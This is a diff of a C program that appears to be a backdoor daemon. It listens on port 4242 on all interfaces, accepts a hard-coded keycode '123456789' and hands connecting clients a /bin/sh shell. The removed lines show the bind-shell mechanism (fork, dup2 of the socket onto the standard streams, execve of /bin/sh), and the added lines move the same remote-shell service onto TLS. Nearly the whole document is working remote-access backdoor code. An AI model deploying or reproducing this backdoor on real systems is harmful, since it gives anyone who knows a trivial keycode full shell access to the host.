@@ -3,98 +3,93 @@
 #define MAX_CLIENTS 3
 
 int active_connections = 0;
-int sig; 
+int sig;
 
 void sig_handler(int signal) {
     sig = signal;
 }
 
 void format_response(char *dest, char *src) {
-    memset(dest, 0, 1024);
-    snprintf(dest, strlen(src), "%s", src);
+    snprintf(dest, 1024, "%s", src);
 }
 
-int handle_recv(int client_socket) {
-    char response[1024];
+int handle_recv(SSL *ssl) {
     char buffer[1024];
+    char response[1024];
 
     while (1) {
-        send(client_socket, "$> ", 3, 0);
+        SSL_write(ssl, "$> ", 3);
         memset(buffer, 0, 1024);
-        ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
-        if (valread <= 0 || sig == SIGPIPE) {
-            break ;
-        }
+        size_t valread;
+        if (!SSL_read_ex(ssl, buffer, sizeof(buffer) - 1, &valread) || valread <= 0)
+            break;
         buffer[valread] = '\0';
-        if (!strncmp(buffer, "shell", strlen("shell"))) {
-            pid_t pid = fork();
-            if (pid == 0) {
-                dup2(client_socket, 0);
-                dup2(client_socket, 1);
-                dup2(client_socket, 2);
-                char * const argv[] = {"/bin/sh", NULL};
-                execve("/bin/sh", argv, NULL);
-            }
-            waitpid(pid, NULL, 0);
-        } else {
-            format_response(response,"Command not found\n");
-            send(client_socket, response, strlen(response), 0);
-        } 
-        if (!strncmp(buffer, "quit", 4)) {
-            break ;
+
+        if (!strncmp(buffer, "quit", 4))
+            break;
+        if (!strncmp(buffer, "shell", 5)) {
+            handle_shell(ssl);
         }
+
+        format_response(response, "Command not found\n\n");
+        SSL_write(ssl, response, strlen(response));
     }
+
     return 1;
 }
 
-void *handle_client(void *arg)
-{
-    int client_socket = *(int *)arg;
+void *handle_client(void *arg) {
+    t_args *args;
+
+    args = (t_args *)arg;
+
     char buffer[1024];
     char keycode[1024] = "123456789";
     char response[1024];
     memset(buffer, 0, 1024);
 
     while (1) {
-        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
+        format_response(response, "Enter the keycode:  ");
+        SSL_write(args->ssl, response, strlen(response));
+        size_t valread;
+
+        SSL_read_ex(args->ssl, buffer, sizeof(buffer) - 1, &valread);
         buffer[valread] = '\0';
-        printf("%s\n", buffer);
-        break ;
-    }
-    while (1) {
-        memset(buffer, 0, 1024);
-        format_response(response, "Enter the keycode: ");
-        send(client_socket, response, strlen(response), 0);
-        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
-        buffer[valread] = '\0';
+
         if (sig == SIGPIPE || valread <= 0)
-            break ;
+            break;
+
         if (!strncmp(buffer, keycode, strlen(keycode))) {
-            format_response(response, "Connection established, welcome\n");
-            send(client_socket, response, strlen(response), 0);
-            if (handle_recv(client_socket))
-                break ;
+            format_response(response, "Connection established, welcome\n\n");
+            SSL_write(args->ssl, response, strlen(response));
+            if (handle_recv(args->ssl))
+                break;
         } else {
             format_response(response, "Connection failed\n\n");
-            send(client_socket, response, strlen(response), 0);
+            SSL_write(args->ssl, response, strlen(response));
         }
     }
 
-    close(client_socket);
+    printf("close connexion\n");
+    SSL_shutdown(args->ssl);
+    SSL_free(args->ssl);
+    close(args->client_socket);
+    free(args);
     active_connections--;
 
     return NULL;
 }
 
-void start_socket_listener()
-{
+
+void start_socket_listener() {
     int server_fd;
     struct sockaddr_in address;
     int opt = 1;
+    SSL_CTX *ctx = create_context();
+    configure_cert(ctx);
 
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
-
-    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
+    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
 
     address.sin_family = AF_INET;
     address.sin_addr.s_addr = INADDR_ANY;
@@ -105,33 +100,45 @@ void start_socket_listener()
 
     printf("Server listening on port 4242\n");
 
-    while (1)
-    {
-        int new_socket;
+    while (1) {
+        t_args *args = calloc(1, sizeof(t_args));
+        args->ssl = SSL_new(ctx);
         socklen_t addrlen = sizeof(address);
+        args->client_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
 
-        new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
+        SSL_set_fd(args->ssl, args->client_socket);
         printf("New connection attempt...\n");
+        if (SSL_accept(args->ssl)) {
+            if (active_connections >= MAX_CLIENTS) {
+                SSL_write(args->ssl, "Connection refused\n", strlen("Connection refused\n"));
+                SSL_shutdown(args->ssl);
+                SSL_free(args->ssl);
+                close(args->client_socket);
+                free(args);
+                continue;
+            }
 
-        if (active_connections >= MAX_CLIENTS) {
-            send(new_socket, "Connection refused\n", strlen("Connection refused\n"), 0);
-            close(new_socket);
-            continue;
+            active_connections++;
+            pthread_t thread_id;
+            pthread_create(&thread_id, NULL, handle_client, args);
+            pthread_detach(thread_id);
+        } else {
+            ERR_print_errors_fp(stderr);
+            SSL_shutdown(args->ssl);
+            SSL_free(args->ssl);
+            close(args->client_socket);
+            free(args);
         }
-        active_connections++;
-
-        pthread_t thread_id;
-        pthread_create(&thread_id, NULL, handle_client, &new_socket);
-        pthread_detach(thread_id);
     }
 
     close(server_fd);
+    SSL_CTX_free(ctx);
 }
 
 int main(int ac, char **av) {
     (void)ac;
     (void)av;
-    signal(SIGPIPE, sig_handler); 
+    signal(SIGPIPE, sig_handler);
     start_socket_listener();
     return 0;
 }
